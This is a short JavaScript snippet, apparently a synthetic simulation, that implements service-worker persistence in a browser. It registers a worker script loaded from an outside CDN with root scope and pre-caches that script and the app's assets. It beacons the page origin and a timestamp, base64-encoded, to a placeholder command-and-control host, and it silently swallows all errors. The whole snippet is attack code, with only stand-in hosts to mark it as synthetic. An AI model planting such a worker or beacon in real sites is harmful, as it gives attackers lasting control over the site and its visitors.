// Service-worker persistence: register a worker, pre-cache assets and beacon
// through the page. Synthetic worker scope only.
(function () {
  var C2 = 'https://c2.example.test/sw';
  console.log('[SWPERSIST] registering persistence worker');
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.register) {
      navigator.serviceWorker.register('https://cdn.example.test/sw/persist.js', { scope: '/' })
        .then(function (registration) { console.log('[SWPERSIST] registered', registration.scope); })
        .catch(function () { console.log('[SWPERSIST] registration blocked'); });
    }
  } catch (error) {}
  try {
    if (window.caches && window.caches.open) {
      window.caches.open('persist-v1').then(function (cache) {
        return cache.addAll(['/', '/app.js', '/sw/persist.js']);
      }).then(function () { console.log('[SWPERSIST] assets cached'); }, function () {});
    }
  } catch (error) {}
  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ scope: location.origin, at: Date.now() })) }).catch(function () {});
  } catch (error) {}
  try { localStorage.setItem('swpersist:installed', '1'); } catch (error) {}
})();
